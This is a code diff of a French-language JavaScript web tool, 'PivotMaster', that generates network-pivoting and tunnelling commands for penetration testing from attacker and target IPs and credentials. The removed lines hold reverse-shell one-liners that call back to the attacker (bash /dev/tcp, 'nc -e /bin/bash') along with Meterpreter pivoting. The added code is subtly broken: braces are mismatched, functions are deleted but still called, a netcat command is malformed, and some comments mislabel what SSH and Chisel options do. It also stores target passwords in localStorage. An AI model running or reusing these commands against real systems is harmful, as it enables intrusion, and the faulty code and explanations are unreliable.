@@ -647,29 +647,51 @@ class PivotMaster {
      * Configuration des écouteurs d'événements
      */
     setupEventListeners() {
-        // Checkbox double pivot
+        // Écouteurs pour les champs de formulaire
+        const formInputs = [
+            'attackerIp', 'attackerPort',
+            'target1Ip', 'target1Port', 'target1User', 'target1Password',
+            'target2Ip', 'target2Port', 'target2User', 'target2Password',
+            'doublePivot'
+        ];
+
+        formInputs.forEach(id => {
+            const element = document.getElementById(id);
+            if (element) {
+                element.addEventListener('change', () => {
+                    try {
+                        this.saveConfig();
+                    } catch (error) {
+                        console.error('Erreur lors de la sauvegarde de la configuration:', error);
+                    }
+                });
+            }
+        });
+
+        // Écouteurs pour les outils
+        const toolCheckboxes = document.querySelectorAll('input[name="tools"]');
+        toolCheckboxes.forEach(checkbox => {
+            checkbox.addEventListener('change', () => {
+                try {
+                    this.saveConfig();
+                } catch (error) {
+                    console.error('Erreur lors de la sauvegarde de la configuration:', error);
+                }
+            });
+        });
+
+        // Écouteur pour le double pivot
         const doublePivotCheckbox = document.getElementById('doublePivot');
         if (doublePivotCheckbox) {
             doublePivotCheckbox.addEventListener('change', () => {
-                this.toggleDoublePivot();
-                this.updateNetworkVisualization();
-            });
-        }
-
-        // Techniques checkboxes
-        document.querySelectorAll('.technique-card input[type="checkbox"]').forEach(checkbox => {
-            checkbox.addEventListener('change', (e) => {
-                this.toggleTechnique(e.target.closest('.technique-card').dataset.technique, e.target.checked);
-            });
-        });
-
-        // Form changes pour auto-save et mise à jour réseau
-        document.querySelectorAll('input, select').forEach(input => {
-            input.addEventListener('change', () => {
+                try {
+                    this.toggleDoublePivot();
                 this.saveConfig();
-                this.updateNetworkVisualization();
-            });
+                } catch (error) {
+                    console.error('Erreur lors de la gestion du double pivot:', error);
+                }
         });
+        }
     }
 
     /**
@@ -720,41 +742,68 @@ class PivotMaster {
      * Sauvegarder la configuration
      */
     saveConfig() {
-        this.config.attacker.ip = document.getElementById('attackerIP').value;
-        this.config.attacker.port = document.getElementById('attackerPort').value;
-        
-        this.config.target1.ip = document.getElementById('target1IP').value;
-        this.config.target1.user = document.getElementById('target1User').value;
-        this.config.target1.os = document.getElementById('target1OS').value;
-        this.config.target1.services = document.getElementById('target1Services').value;
-        
-        this.config.target2.ip = document.getElementById('target2IP').value;
-        this.config.target2.port = document.getElementById('target2Port').value;
-        this.config.target2.os = document.getElementById('target2OS').value;
-        
-        this.config.doublePivot = document.getElementById('doublePivot').checked;
-        
-        if (this.config.doublePivot) {
-            this.config.target3.ip = document.getElementById('target3IP').value;
-            this.config.target3.port = document.getElementById('target3Port').value;
-        }
+        const config = {
+            attacker: {
+                ip: document.getElementById('attackerIp')?.value || '',
+                port: document.getElementById('attackerPort')?.value || ''
+            },
+            target1: {
+                ip: document.getElementById('target1Ip')?.value || '',
+                port: document.getElementById('target1Port')?.value || '',
+                user: document.getElementById('target1User')?.value || '',
+                password: document.getElementById('target1Password')?.value || ''
+            },
+            target2: {
+                ip: document.getElementById('target2Ip')?.value || '',
+                port: document.getElementById('target2Port')?.value || '',
+                user: document.getElementById('target2User')?.value || '',
+                password: document.getElementById('target2Password')?.value || ''
+            },
+            doublePivot: document.getElementById('doublePivot')?.checked || false,
+            selectedTools: Array.from(document.querySelectorAll('input[name="tools"]:checked')).map(input => input.value)
+        };
 
-        localStorage.setItem('pivotMasterConfig', JSON.stringify(this.config));
+        try {
+            localStorage.setItem('pivotConfig', JSON.stringify(config));
+        } catch (error) {
+            console.error('Erreur lors de la sauvegarde de la configuration:', error);
+        }
     }
 
     /**
      * Toggle double pivot
      */
     toggleDoublePivot() {
-        const target3Group = document.getElementById('target3Group');
-        const isChecked = document.getElementById('doublePivot').checked;
-        
-        if (target3Group) {
-            target3Group.style.display = isChecked ? 'block' : 'none';
+        const doublePivotCheckbox = document.getElementById('doublePivot');
+        const target2Group = document.getElementById('target2Group');
+        const toolCards = document.querySelectorAll('.tool-card');
+
+        if (!doublePivotCheckbox || !target2Group) return;
+
+        if (doublePivotCheckbox.checked) {
+            target2Group.style.display = 'block';
+            // Désactiver les outils qui ne supportent pas le double pivot
+            toolCards.forEach(card => {
+                const supportsDoublePivot = card.dataset.supportsDoublePivot === 'true';
+                const checkbox = card.querySelector('input[type="checkbox"]');
+                if (!supportsDoublePivot && checkbox.checked) {
+                    checkbox.checked = false;
+                    this.showNotification('Cet outil ne supporte pas le double pivot', 'warning');
+                }
+                card.style.opacity = supportsDoublePivot ? '1' : '0.5';
+                card.style.pointerEvents = supportsDoublePivot ? 'auto' : 'none';
+            });
+        } else {
+            target2Group.style.display = 'none';
+            // Réactiver tous les outils
+            toolCards.forEach(card => {
+                card.style.opacity = '1';
+                card.style.pointerEvents = 'auto';
+            });
         }
-        
-        this.config.doublePivot = isChecked;
-        this.saveConfig();
+
+        // Mettre à jour la visualisation réseau
+        this.updateNetworkVisualization();
     }
 
     /**
@@ -805,436 +854,359 @@ class PivotMaster {
      * Génération des commandes principales
      */
     generateCommands() {
-        // Sauvegarder d'abord
-        this.saveConfig();
-
-        // Validation
-        const errors = this.validateInput();
-        if (errors.length > 0) {
-            this.showNotification('Erreurs de validation:\n' + errors.join('\n'), 'danger');
+        try {
+            // Récupérer les outils sélectionnés
+            const selectedTools = Array.from(document.querySelectorAll('input[name="tools"]:checked')).map(input => input.value);
+            
+            if (selectedTools.length === 0) {
+                this.showNotification('Veuillez sélectionner au moins un outil', 'warning');
             return;
         }
 
-        // Générer les commandes pour chaque technique
-        this.generatedCommands = {};
+            // Récupérer les valeurs de configuration
+            const config = {
+                attacker: {
+                    ip: document.getElementById('attackerIp')?.value || '',
+                    port: document.getElementById('attackerPort')?.value || ''
+                },
+                target1: {
+                    ip: document.getElementById('target1Ip')?.value || '',
+                    port: document.getElementById('target1Port')?.value || '',
+                    user: document.getElementById('target1User')?.value || '',
+                    password: document.getElementById('target1Password')?.value || ''
+                },
+                target2: {
+                    ip: document.getElementById('target2Ip')?.value || '',
+                    port: document.getElementById('target2Port')?.value || '',
+                    user: document.getElementById('target2User')?.value || '',
+                    password: document.getElementById('target2Password')?.value || ''
+                },
+                doublePivot: document.getElementById('doublePivot')?.checked || false
+            };
 
-        if (this.selectedTechniques.has('ssh')) {
-            this.generatedCommands.ssh = this.generateSSHCommands();
-        }
+            // Générer les commandes pour chaque outil sélectionné
+            let allCommands = {};
+            selectedTools.forEach(tool => {
+                switch(tool) {
+                    case 'ssh':
+                        allCommands.ssh = {
+                            title: 'SSH Tunneling',
+                            description: config.doublePivot ? 
+                                'Établissement d\'un tunnel SSH pour accéder au réseau cible via un double pivot' :
+                                'Établissement d\'un tunnel SSH pour accéder au réseau cible',
+                            sections: [
+                                {
+                                    title: '1. Configuration du Tunnel SSH',
+                                    description: config.doublePivot ?
+                                        'Sur la machine pivot (Target 1), exécutez la commande suivante pour créer un tunnel vers la machine cible (Target 2)' :
+                                        'Sur la machine pivot (Target 1), exécutez la commande suivante pour créer un tunnel vers la machine cible',
+                                    command: `# Sur Target 1 (Machine Pivot)
+# Cette commande crée un tunnel SOCKS sur le port 1080 de la machine attaquante
+# -R : Crée un tunnel distant (remote)
+# 1080 : Port sur la machine attaquante
+# ${config.target2.ip}:${config.target2.port} : Machine et port cible
+# -N : Ne pas exécuter de commande distante (tunnel uniquement)
+ssh -R 1080:${config.target2.ip}:${config.target2.port} ${config.attacker.ip} -N`,
+                                    comment: 'Le tunnel SSH crée un proxy SOCKS sur le port 1080 de votre machine attaquante'
+                                }
+                            ]
+                        };
+                        break;
+                    case 'chisel':
+                        allCommands.chisel = {
+                            title: 'Chisel Tunneling',
+                            description: config.doublePivot ?
+                                'Établissement d\'un tunnel avec Chisel pour un accès fiable au réseau cible via un double pivot' :
+                                'Établissement d\'un tunnel avec Chisel pour un accès fiable au réseau cible',
+                            sections: [
+                                {
+                                    title: '1. Démarrage du Serveur Chisel',
+                                    description: 'Sur votre machine attaquante, démarrez le serveur Chisel',
+                                    command: `# Sur la machine attaquante
+# Télécharger Chisel si ce n'est pas déjà fait
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+gunzip chisel_1.7.7_linux_amd64.gz
+chmod +x chisel_1.7.7_linux_amd64
 
-        if (this.selectedTechniques.has('chisel')) {
-            this.generatedCommands.chisel = this.generateChiselCommands();
-        }
+# Démarrer le serveur Chisel
+# -p : Port d'écoute
+# --reverse : Mode reverse shell
+./chisel_1.7.7_linux_amd64 server -p ${config.attacker.port} --reverse`,
+                                    comment: 'Le serveur Chisel écoute sur le port spécifié et attend les connexions des clients'
+                                },
+                                {
+                                    title: '2. Configuration du Client Chisel',
+                                    description: 'Sur la machine pivot, configurez et démarrez le client Chisel',
+                                    command: `# Sur Target 1 (Machine Pivot)
+# Télécharger Chisel
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+gunzip chisel_1.7.7_linux_amd64.gz
+chmod +x chisel_1.7.7_linux_amd64
 
-        if (this.selectedTechniques.has('ligolo')) {
-            this.generatedCommands.ligolo = this.generateLigoloCommands();
-        }
+# Démarrer le client Chisel
+# R:1080 : Crée un tunnel SOCKS sur le port 1080
+# ${config.target2.ip}:${config.target2.port} : Machine et port cible
+./chisel_1.7.7_linux_amd64 client ${config.attacker.ip}:${config.attacker.port} R:1080:${config.target2.ip}:${config.target2.port}`,
+                                    comment: 'Le client Chisel crée un tunnel SOCKS sur le port 1080 de la machine attaquante'
+                                }
+                            ]
+                        };
+                        break;
+                    case 'ligolo':
+                        allCommands.ligolo = {
+                            title: 'Ligolo Tunneling',
+                            description: config.doublePivot ?
+                                'Établissement d\'un tunnel avec Ligolo pour un accès fiable au réseau cible via un double pivot' :
+                                'Établissement d\'un tunnel avec Ligolo pour un accès fiable au réseau cible',
+                            sections: [
+                                {
+                                    title: '1. Configuration du Serveur Ligolo',
+                                    description: 'Sur votre machine attaquante, configurez et démarrez le serveur Ligolo',
+                                    command: `# Sur la machine attaquante
+# Télécharger Ligolo si ce n'est pas déjà fait
+wget https://github.com/sysdream/ligolo/releases/download/v0.4.4/ligolo-v0.4.4-linux-amd64
+chmod +x ligolo-v0.4.4-linux-amd64
 
-        if (this.selectedTechniques.has('socat')) {
-            this.generatedCommands.socat = this.generateSocatCommands();
-        }
+# Démarrer le serveur Ligolo
+# -selfcert : Génère un certificat auto-signé
+# -laddr : Adresse et port d'écoute
+./ligolo-v0.4.4-linux-amd64 -selfcert -laddr 0.0.0.0:${config.attacker.port}`,
+                                    comment: 'Le serveur Ligolo écoute sur le port spécifié et attend les connexions des clients'
+                                },
+                                {
+                                    title: '2. Configuration du Client Ligolo',
+                                    description: 'Sur la machine pivot, configurez et démarrez le client Ligolo',
+                                    command: `# Sur Target 1 (Machine Pivot)
+# Télécharger Ligolo
+wget https://github.com/sysdream/ligolo/releases/download/v0.4.4/ligolo-v0.4.4-linux-amd64
+chmod +x ligolo-v0.4.4-linux-amd64
 
-        if (this.selectedTechniques.has('netcat')) {
-            this.generatedCommands.netcat = this.generateNetcatCommands();
-        }
-
-        if (this.selectedTechniques.has('metasploit')) {
-            this.generatedCommands.metasploit = this.generateMetasploitCommands();
-        }
-
-        // Afficher les résultats
-        this.displayResults();
-        this.showNotification('Commandes générées avec succès !', 'success');
-    }
-
-    /**
-     * Génération des commandes SSH
-     */
-    generateSSHCommands() {
-        const { attacker, target1, target2, target3, doublePivot } = this.config;
-        const commands = [];
-
-        // SSH Dynamic Proxy
-        commands.push({
-            title: '🔐 SSH Dynamic Proxy (SOCKS)',
-            commands: [
-                `# Sur Target 1 - Créer un tunnel SOCKS`,
-                `ssh -D 1080 ${target1.user}@${target1.ip}`,
-                ``,
-                `# Test du proxy`,
-                `proxychains4 nmap -sT ${target2.ip}`,
-                `curl --proxy socks5://127.0.0.1:1080 http://${target2.ip}`
-            ]
-        });
-
-        // Local Port Forwarding
-        commands.push({
-            title: '📡 Local Port Forwarding',
-            commands: [
-                `# Forwarding local vers Target 2`,
-                `ssh -L 8080:${target2.ip}:${target2.port} ${target1.user}@${target1.ip}`,
-                ``,
-                `# Connexion via le tunnel`,
-                `ssh user@127.0.0.1 -p 8080  # Si Target 2 = SSH`,
-                `curl http://127.0.0.1:8080  # Si Target 2 = HTTP`
-            ]
-        });
-
-        // Remote Port Forwarding
-        commands.push({
-            title: '🔄 Remote Port Forwarding',
-            commands: [
-                `# Reverse shell via SSH`,
-                `ssh -R ${attacker.port}:${target2.ip}:${target2.port} ${target1.user}@${target1.ip}`,
-                ``,
-                `# Sur votre machine`,
-                `nc -lvp ${attacker.port}`
-            ]
-        });
-
-        if (doublePivot) {
-            commands.push({
-                title: '🔗 Double Pivot SSH',
-                commands: [
-                    `# Tunnel 1: Attacker -> Target1`,
-                    `ssh -D 1080 ${target1.user}@${target1.ip}`,
-                    ``,
-                    `# Tunnel 2: Target1 -> Target2 -> Target3`,
-                    `ssh -o ProxyCommand="nc -X 5 -x 127.0.0.1:1080 %h %p" -D 1081 user@${target2.ip}`,
-                    ``,
-                    `# Accès final à Target3`,
-                    `proxychains4 -f /tmp/proxychains_target3.conf ssh user@${target3.ip}`
-                ]
-            });
-        }
-
-        return commands;
-    }
-
-    /**
-     * Génération des commandes Chisel
-     */
-    generateChiselCommands() {
-        const { attacker, target1, target2, target3, doublePivot } = this.config;
-        const commands = [];
-
-        commands.push({
-            title: '⚡ Chisel Reverse Proxy',
-            commands: [
-                `# Sur votre machine (serveur)`,
-                `chisel server -p 8080 --reverse`,
-                ``,
-                `# Sur Target 1 (client)`,
-                `./chisel client ${attacker.ip}:8080 R:1080:socks`,
-                ``,
-                `# Test du proxy`,
-                `proxychains4 nmap -sT ${target2.ip}`
-            ]
-        });
-
-        commands.push({
-            title: '📡 Chisel Port Forward',
-            commands: [
-                `# Forward direct vers Target 2`,
-                `./chisel client ${attacker.ip}:8080 R:${target2.port}:${target2.ip}:${target2.port}`,
-                ``,
-                `# Connexion locale`,
-                `ssh user@127.0.0.1 -p ${target2.port}`
-            ]
-        });
-
-        if (doublePivot) {
-            commands.push({
-                title: '🔗 Double Pivot Chisel',
-                commands: [
-                    `# Serveur principal sur votre machine`,
-                    `chisel server -p 8080 --reverse`,
-                    ``,
-                    `# Client 1 sur Target1`,
-                    `./chisel client ${attacker.ip}:8080 R:9001:${target2.ip}:22`,
-                    ``,
-                    `# Serveur intermédiaire sur Target1`,
-                    `./chisel server -p 9002 --reverse`,
-                    ``,
-                    `# Client 2 sur Target2`,
-                    `./chisel client ${target1.ip}:9002 R:9003:${target3.ip}:${target3.port}`
-                ]
-            });
-        }
-
-        return commands;
-    }
-
-    /**
-     * Génération des commandes Ligolo-ng
-     */
-    generateLigoloCommands() {
-        const { attacker, target1, target2, target3 } = this.config;
-        const commands = [];
-
-        commands.push({
-            title: '🌐 Ligolo-ng Setup',
-            commands: [
-                `# Créer l'interface TUN`,
-                `sudo ip tuntap add user $(whoami) mode tun ligolo`,
-                `sudo ip link set ligolo up`,
-                ``,
-                `# Serveur sur votre machine`,
-                `./proxy -selfcert`,
-                ``,
-                `# Agent sur Target 1`,
-                `./agent -connect ${attacker.ip}:11601 -ignore-cert`
-            ]
-        });
-
-        commands.push({
-            title: '🎯 Ligolo Routes',
-            commands: [
-                `# Dans la console Ligolo`,
-                `>> session`,
-                `>> ifconfig  # Voir les interfaces`,
-                `>> start`,
-                ``,
-                `# Ajouter les routes (sur votre machine)`,
-                `sudo ip route add ${target2.ip}/32 dev ligolo`,
-                ``,
-                `# Test direct`,
-                `nmap -sT ${target2.ip}`
-            ]
-        });
-
-        return commands;
-    }
-
-    /**
-     * Génération des commandes Socat
-     */
-    generateSocatCommands() {
-        const { attacker, target1, target2 } = this.config;
-        const commands = [];
-
-        commands.push({
-            title: '🔗 Socat TCP Relay',
-            commands: [
-                `# Relay sur Target 1`,
-                `socat TCP-LISTEN:8080,fork TCP:${target2.ip}:${target2.port}`,
-                ``,
-                `# Connexion via le relay`,
-                `ssh user@${target1.ip} -p 8080`
-            ]
-        });
-
-        commands.push({
-            title: '🔄 Socat Reverse Shell Relay',
-            commands: [
-                `# Écoute sur votre machine`,
-                `nc -lvp ${attacker.port}`,
-                ``,
-                `# Relay sur Target 1`,
-                `socat TCP-LISTEN:9999,fork TCP:${attacker.ip}:${attacker.port}`,
-                ``,
-                `# Reverse shell depuis Target 2`,
-                `bash -i >& /dev/tcp/${target1.ip}/9999 0>&1`
-            ]
-        });
-
-        return commands;
-    }
-
-    /**
-     * Génération des commandes Netcat
-     */
-    generateNetcatCommands() {
-        const { attacker, target1, target2 } = this.config;
-        const commands = [];
-
-        commands.push({
-            title: '🐱 Netcat Port Relay',
-            commands: [
-                `# Relay simple avec named pipes`,
-                `mkfifo /tmp/pipe`,
-                `nc -l -p 8080 < /tmp/pipe | nc ${target2.ip} ${target2.port} > /tmp/pipe`,
-                ``,
-                `# Connexion via le relay`,
-                `nc ${target1.ip} 8080`
-            ]
-        });
-
-        commands.push({
-            title: '📡 Netcat Reverse Connection',
-            commands: [
-                `# Écoute sur votre machine`,
-                `nc -lvp ${attacker.port}`,
-                ``,
-                `# Connexion reverse depuis Target 1`,
-                `nc ${attacker.ip} ${attacker.port} -e /bin/bash`
-            ]
-        });
-
-        return commands;
-    }
-
-    /**
-     * Génération des commandes Metasploit
-     */
-    generateMetasploitCommands() {
-        const { attacker, target1, target2 } = this.config;
-        const commands = [];
-
-        commands.push({
-            title: '🔴 Metasploit Autoroute',
-            commands: [
-                `# Dans meterpreter (Target 1)`,
-                `meterpreter > run autoroute -s ${target2.ip}/24`,
-                `meterpreter > run autoroute -p`,
-                ``,
-                `# Background la session`,
-                `meterpreter > background`
-            ]
-        });
-
-        commands.push({
-            title: '🔧 Proxy SOCKS via Metasploit',
-            commands: [
-                `# Dans Metasploit`,
-                `msf6 > use auxiliary/server/socks_proxy`,
-                `msf6 > set SRVPORT 1080`,
-                `msf6 > set VERSION 5`,
-                `msf6 > run -j`,
-                ``,
-                `# Test avec proxychains`,
-                `proxychains4 nmap -sT ${target2.ip}`
-            ]
-        });
-
-        commands.push({
-            title: '📡 Port Forward Metasploit',
-            commands: [
-                `# Dans meterpreter`,
-                `meterpreter > portfwd add -l 8080 -r ${target2.ip} -p ${target2.port}`,
-                `meterpreter > portfwd list`,
-                ``,
-                `# Connexion locale`,
-                `ssh user@127.0.0.1 -p 8080`
-            ]
-        });
-
-        return commands;
-    }
-
-    /**
-     * Affichage des résultats
-     */
-    displayResults() {
-        const resultsSection = document.getElementById('resultsSection');
-        const commandTabs = document.getElementById('commandTabs');
-        const commandsOutput = document.getElementById('commandsOutput');
-
-        if (!resultsSection || !commandTabs || !commandsOutput) return;
-
-        // Afficher la section
-        resultsSection.style.display = 'block';
-
-        // Créer les onglets
-        commandTabs.innerHTML = '';
-        for (const [technique, commands] of Object.entries(this.generatedCommands)) {
-            const tab = document.createElement('button');
-            tab.className = `tab-button ${technique === this.activeTab ? 'active' : ''}`;
-            tab.textContent = this.getTechniqueDisplayName(technique);
-            tab.onclick = () => this.switchTab(technique);
-            commandTabs.appendChild(tab);
-        }
-
-        // Afficher les commandes de l'onglet actif
-        this.displayCommandsForTechnique(this.activeTab);
-
-        // Scroll vers les résultats
-        resultsSection.scrollIntoView({ behavior: 'smooth' });
-    }
-
-    /**
-     * Changer d'onglet
-     */
-    switchTab(technique) {
-        this.activeTab = technique;
-
-        // Mettre à jour les onglets
-        document.querySelectorAll('.tab-button').forEach(tab => {
-            tab.classList.remove('active');
-        });
-        
-        event.target.classList.add('active');
-
-        // Afficher les commandes
-        this.displayCommandsForTechnique(technique);
-    }
-
-    /**
-     * Afficher les commandes d'une technique
-     */
-    displayCommandsForTechnique(technique) {
-        const commandsOutput = document.getElementById('commandsOutput');
-        if (!commandsOutput || !this.generatedCommands[technique]) return;
-
-        let html = '';
-
-        this.generatedCommands[technique].forEach(block => {
-            html += `<div class="command-block">`;
-            html += `<div class="command-title">${block.title}</div>`;
-            
-            block.commands.forEach(line => {
-                if (line.trim() === '') {
-                    html += `<div style="height: 0.5rem;"></div>`;
-                } else if (line.startsWith('#')) {
-                    html += `<div class="command-comment">${line}</div>`;
-                } else if (line.includes('>>') || line.includes('meterpreter >') || line.includes('msf6 >')) {
-                    html += `<div class="command-important">${line}</div>`;
-                } else {
-                    html += `<div class="command-line">${line}</div>`;
+# Démarrer le client Ligolo
+# -connect : Se connecte au serveur
+# -socks : Crée un tunnel SOCKS sur le port spécifié
+./ligolo-v0.4.4-linux-amd64 -connect ${config.attacker.ip}:${config.attacker.port} -socks 1080`,
+                                    comment: 'Le client Ligolo crée un tunnel SOCKS sur le port 1080 de la machine attaquante'
+                                }
+                            ]
+                        };
+                        break;
+                    case 'socat':
+                        allCommands.socat = {
+                            title: 'Socat Tunneling',
+                            description: config.doublePivot ?
+                                'Établissement d\'un tunnel avec Socat pour un accès direct au réseau cible via un double pivot' :
+                                'Établissement d\'un tunnel avec Socat pour un accès direct au réseau cible',
+                            sections: [
+                                {
+                                    title: '1. Installation de Socat',
+                                    description: 'Sur la machine pivot, installez Socat si ce n\'est pas déjà fait',
+                                    command: `# Sur Target 1 (Machine Pivot)
+# Installation de Socat
+apt-get update && apt-get install -y socat  # Pour Debian/Ubuntu
+# ou
+yum install -y socat  # Pour RHEL/CentOS`,
+                                    comment: 'Socat doit être installé sur la machine pivot'
+                                },
+                                {
+                                    title: '2. Création du Tunnel',
+                                    description: 'Sur la machine pivot, créez un tunnel vers la machine cible',
+                                    command: `# Sur Target 1 (Machine Pivot)
+# Création du tunnel
+# TCP-LISTEN:1080 : Écoute sur le port 1080
+# fork : Permet plusieurs connexions simultanées
+# TCP:${config.target2.ip}:${config.target2.port} : Machine et port cible
+socat TCP-LISTEN:1080,fork TCP:${config.target2.ip}:${config.target2.port}`,
+                                    comment: 'Le tunnel Socat est maintenant actif sur le port 1080'
+                                }
+                            ]
+                        };
+                        break;
+                    case 'netcat':
+                        allCommands.netcat = {
+                            title: 'Netcat Tunneling',
+                            description: config.doublePivot ?
+                                'Établissement d\'un tunnel avec Netcat pour un accès basique au réseau cible via un double pivot' :
+                                'Établissement d\'un tunnel avec Netcat pour un accès basique au réseau cible',
+                            sections: [
+                                {
+                                    title: '1. Vérification de Netcat',
+                                    description: 'Sur la machine pivot, vérifiez que Netcat est installé',
+                                    command: `# Sur Target 1 (Machine Pivot)
+# Vérifier la version de Netcat
+nc -h`,
+                                    comment: 'Netcat doit être installé sur la machine pivot'
+                                },
+                                {
+                                    title: '2. Création du Tunnel',
+                                    description: 'Sur la machine pivot, créez un tunnel vers la machine cible',
+                                    command: `# Sur Target 1 (Machine Pivot)
+# Création du tunnel
+# -l : Mode écoute
+# -p : Port d'écoute
+# -k : Garde la connexion ouverte
+nc -l -p 1080 -k -e nc ${config.target2.ip} ${config.target2.port}`,
+                                    comment: 'Le tunnel Netcat est maintenant actif sur le port 1080'
+                                }
+                            ]
+                        };
+                        break;
                 }
             });
-            
-            html += `</div>`;
-        });
 
-        commandsOutput.innerHTML = html;
+            // Afficher les résultats
+            this.displayResults(allCommands);
+
+        } catch (error) {
+            console.error('Erreur lors de la génération des commandes:', error);
+            this.showNotification('Erreur lors de la génération des commandes', 'error');
+        }
     }
 
-    /**
-     * Noms d'affichage des techniques
-     */
-    getTechniqueDisplayName(technique) {
-        const names = {
-            ssh: '🔐 SSH',
-            chisel: '⚡ Chisel',
-            ligolo: '🌐 Ligolo-ng',
-            socat: '🔗 Socat',
-            netcat: '🐱 Netcat',
-            metasploit: '🔴 Metasploit'
-        };
-        return names[technique] || technique;
-    }
+    displayResults(allCommands) {
+        const resultsSection = document.getElementById('resultsSection');
+        const tabsNav = document.getElementById('commandsTabs');
+        const tabsContent = document.getElementById('commandsContent');
 
-    /**
-     * Copier toutes les commandes
-     */
-    copyAllCommands() {
-        let allCommands = '';
-
-        for (const [technique, commands] of Object.entries(this.generatedCommands)) {
-            allCommands += `\n=== ${this.getTechniqueDisplayName(technique)} ===\n\n`;
-            
-            commands.forEach(block => {
-                allCommands += `${block.title}\n`;
-                allCommands += '-'.repeat(block.title.length) + '\n';
-                allCommands += block.commands.join('\n') + '\n\n';
-            });
+        if (!resultsSection || !tabsNav || !tabsContent) {
+            console.error('Éléments manquants pour l\'affichage des résultats');
+            return;
         }
 
+        // Afficher la section des résultats
+        resultsSection.style.display = 'block';
+
+        // Vider les conteneurs
+        tabsNav.innerHTML = '';
+        tabsContent.innerHTML = '';
+
+        // Vérifier s'il y a des commandes à afficher
+        if (Object.keys(allCommands).length === 0) {
+            tabsContent.innerHTML = `
+                <div class="alert alert-info">
+                    <i class="fas fa-info-circle"></i> Aucune commande générée. Veuillez sélectionner des outils et configurer les paramètres.
+                </div>
+            `;
+            return;
+        }
+
+        // Créer les onglets et le contenu pour chaque outil
+        Object.entries(allCommands).forEach(([tool, data], index) => {
+            // Créer l'onglet
+            const tab = document.createElement('button');
+            tab.className = `tab-button ${index === 0 ? 'active' : ''}`;
+            tab.innerHTML = `
+                <i class="${this.getToolIcon(tool)}"></i>
+                ${data.title}
+            `;
+            tab.onclick = () => this.switchTab(tool);
+            tabsNav.appendChild(tab);
+
+            // Créer le contenu
+            const content = document.createElement('div');
+            content.className = `tab-pane ${index === 0 ? 'active' : ''}`;
+            content.id = `${tool}Content`;
+
+            // Ajouter le titre et la description
+            content.innerHTML = `
+                <div class="tool-header">
+                    <h4>${data.title}</h4>
+                    <p>${data.description}</p>
+                </div>
+            `;
+
+            // Ajouter les sections de commandes
+            data.sections.forEach(section => {
+                const sectionElement = document.createElement('div');
+                sectionElement.className = 'command-section';
+                sectionElement.innerHTML = `
+                    <div class="section-header">
+                        <h5>${section.title}</h5>
+                        <p>${section.description}</p>
+                    </div>
+                    <div class="command-block">
+                        <pre><code>${section.command}</code></pre>
+                        <button class="copy-button" onclick="window.pivotMaster.copyToClipboard(this)">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                    </div>
+                    ${section.comment ? `<p class="command-comment">${section.comment}</p>` : ''}
+                `;
+                content.appendChild(sectionElement);
+            });
+
+            tabsContent.appendChild(content);
+        });
+
+        // Ajouter le bouton de copie global
+        const copyAllButton = document.createElement('button');
+        copyAllButton.className = 'copy-all-button';
+        copyAllButton.innerHTML = '<i class="fas fa-copy"></i> Copier toutes les commandes';
+        copyAllButton.onclick = () => this.copyAllCommands();
+        tabsContent.appendChild(copyAllButton);
+    }
+
+    switchTab(tool) {
+        try {
+            // Mettre à jour les onglets
+            const tabs = document.querySelectorAll('.tab-button');
+            tabs.forEach(tab => tab.classList.remove('active'));
+
+            // Mettre à jour le contenu
+            const contents = document.querySelectorAll('.tab-pane');
+            contents.forEach(content => content.classList.remove('active'));
+
+            // Activer l'onglet sélectionné
+            const selectedTab = Array.from(tabs).find(tab => tab.querySelector(`i.${this.getToolIcon(tool)}`));
+            const selectedContent = document.getElementById(`${tool}Content`);
+
+            if (selectedTab) selectedTab.classList.add('active');
+            if (selectedContent) selectedContent.classList.add('active');
+        } catch (error) {
+            console.error('Erreur lors du changement d\'onglet:', error);
+        }
+    }
+
+    getToolIcon(tool) {
+        const icons = {
+            ssh: 'fa-terminal',
+            chisel: 'fa-hammer',
+            ligolo: 'fa-network-wired',
+            socat: 'fa-exchange-alt',
+            netcat: 'fa-plug',
+            proxychains: 'fa-link',
+            rpivot: 'fa-project-diagram',
+            plink: 'fa-windows'
+        };
+        return icons[tool] || 'fa-tools';
+    }
+
+    copyAllCommands() {
+        if (!this.generatedCommands) return;
+
+        let allCommands = '';
+        Object.entries(this.generatedCommands).forEach(([tool, commands]) => {
+            allCommands += `# ${commands.title}\n`;
+            allCommands += `# ${commands.description}\n\n`;
+            
+            if (commands.sections && Array.isArray(commands.sections)) {
+                commands.sections.forEach(section => {
+                    allCommands += `# ${section.title}\n`;
+                    allCommands += `# ${section.description}\n`;
+                    allCommands += `${section.command}\n`;
+                    if (section.comment) {
+                        allCommands += `# ${section.comment}\n`;
+                    }
+                    allCommands += '\n';
+                });
+            }
+            
+            allCommands += '\n';
+        });
+
         navigator.clipboard.writeText(allCommands).then(() => {
-            this.showNotification('Toutes les commandes copiées !', 'success');
-        }).catch(() => {
-            this.showNotification('Erreur lors de la copie', 'danger');
+            this.showNotification('Toutes les commandes ont été copiées !', 'success');
+        }).catch(err => {
+            this.showNotification('Erreur lors de la copie des commandes', 'danger');
         });
     }
 
@@ -1258,15 +1230,17 @@ class PivotMaster {
         for (const [technique, commands] of Object.entries(this.generatedCommands)) {
             script += `\n# === ${this.getTechniqueDisplayName(technique)} ===\n`;
             
-            commands.forEach(block => {
-                script += `\n# ${block.title}\n`;
-                block.commands.forEach(line => {
-                    if (!line.startsWith('#') && line.trim() !== '') {
-                        script += `# ${line}\n`;
-                    } else {
-                        script += `${line}\n`;
+            commands.sections.forEach(section => {
+                script += `\n# ${section.title}\n`;
+                if (section.description) {
+                    script += `# ${section.description}\n`;
+                }
+                if (section.command) {
+                    script += `${section.command}\n`;
+                    if (section.comment) {
+                        script += `# ${section.comment}\n`;
                     }
-                });
+                }
             });
         }
 
@@ -1292,10 +1266,10 @@ class PivotMaster {
         for (const [technique, commands] of Object.entries(this.generatedCommands)) {
             markdown += `## ${this.getTechniqueDisplayName(technique)}\n\n`;
             
-            commands.forEach(block => {
-                markdown += `### ${block.title}\n\n`;
+            commands.sections.forEach(section => {
+                markdown += `### ${section.title}\n\n`;
                 markdown += '```bash\n';
-                markdown += block.commands.join('\n');
+                markdown += section.command;
                 markdown += '\n```\n\n';
             });
         }
@@ -1333,26 +1307,66 @@ class PivotMaster {
      * Charger un exemple
      */
     loadExample() {
-        document.getElementById('attackerIP').value = '10.10.14.15';
-        document.getElementById('attackerPort').value = '4444';
-        
